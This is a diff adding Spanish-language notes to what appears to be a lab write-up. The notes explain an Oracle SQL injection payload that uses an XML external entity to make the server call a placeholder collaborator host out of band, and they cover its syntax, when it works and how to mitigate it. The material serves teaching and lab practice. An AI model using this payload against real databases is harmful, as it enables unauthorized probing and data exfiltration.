@@ -45,3 +45,93 @@ Vemos que recibimos las peticiones en el Burp Collaborator:
 
 Y resolvimos el laboratorio:
 <img width="1630" height="943" alt="image" src="https://github.com/user-attachments/assets/03915936-84e0-4b29-9b1d-79c494364130" />
+
+
+---
+
+
+
+# XXE / OAST en Oracle — explicación simple de la sintaxis
+
+**Payload ejemplo**
+
+```sql
+SELECT EXTRACTVALUE(
+  xmltype(
+    '<?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE root [
+       <!ENTITY % remote SYSTEM "http://<UNIQUE_ID>.collaborator.net/">
+       %remote;
+     ]>'
+  ),
+  '/l'
+) FROM dual;
+```
+
+## Explicación de ataque
+
+Construye un documento XML con una entidad externa (`SYSTEM "http://..."`) y lo parsea con `xmltype`/`EXTRACTVALUE`. Al parsearlo, el parser XML intenta resolver la entidad externa y realiza una petición de red hacia el dominio controlado por el atacante — esto es la señal OOB/XXE.
+
+---
+
+## Desglose sintáctico
+
+* `SELECT EXTRACTVALUE(..., '/l') FROM dual;`
+  Ejecuta `EXTRACTVALUE` sobre un `xmltype` y pide el nodo XPath `/l` (aquí el valor no importa: lo relevante es que se parsea el XML).
+
+* `xmltype('...')`
+  Crea un objeto XML a partir de la cadena interna; el parser XML procesa la DTD y las entidades.
+
+* `<?xml version="1.0" encoding="UTF-8"?>`
+  Declaración estándar XML (no obligatoria para el exploit, pero habitual).
+
+* `<!DOCTYPE root [ ... ]>`
+  Define una DTD interna para el documento cuya raíz será `root`. Dentro de los corchetes `[...]` se declaran entidades.
+
+* `<!ENTITY % remote SYSTEM "http://<UNIQUE_ID>.collaborator.net/">`
+  **Define una entidad parámetro** llamada `%remote` cuya fuente (`SYSTEM`) es una URL externa. Al resolverla, el parser hará una petición a esa URL.
+
+* `%remote;`
+  **Expande la entidad**: indica al parser que incluya el contenido de `%remote` en la DTD, lo que fuerza la resolución remota.
+
+* `'/l'` dentro de `EXTRACTVALUE`
+  XPath de extracción; aquí se usa sólo para forzar el parseo del XML. No es necesario que exista `/l`.
+
+* `FROM dual`
+  En Oracle, `DUAL` es una tabla dummy que permite ejecutar expresiones sin necesidad de una tabla real.
+
+---
+
+## Por qué provoca una petición externa (OAST)
+
+Al ver `SYSTEM "http://..."`, el parser intenta **cargar** el contenido de esa URL para resolver la entidad. Esa carga genera una solicitud de red (DNS/HTTP) hacia el dominio del atacante, que puede detectar y registrar la interacción.
+
+---
+
+## Cuándo funciona / cuándo falla
+
+**Funciona si:**
+
+* El parser XML permite entidades externas (XXE no mitigado).
+* La red permite egress DNS/HTTP (el servidor puede resolver/llamar fuera).
+* Puedes inyectar el bloque DOCTYPE en el contexto donde se evalúa `xmltype`.
+
+**Falla si:**
+
+* El parser tiene la resolución de entidades externas desactivada.
+* La red bloquea egress o fuerza resoluciones internas.
+* La aplicación sanitiza o impide insertar DOCTYPE/ENTITY.
+
+---
+
+## Riesgos y mitigaciones rápidas
+
+* **Riesgo:** exfiltración de datos vía DNS/HTTP, ejecución remota de solicitudes, descubrimiento de configuración interna.
+* **Mitigaciones:** desactivar resolución de entidades externas en parsers XML; validar/limitar contenido XML entrante; aplicar egress filtering (bloquear DNS/HTTP saliente no autorizado); parchear/actualizar librerías XML.
+
+
+
+---
+
+**Resumen:** la inyección usa una DTD con `SYSTEM` para forzar que el parser haga una llamada externa. Es una mezcla de XXE (XML External Entity) y OAST (out‑of‑band) que, cuando está permitida, permite detectar y exfiltrar información desde bases Oracle u otros parsers XML.
+
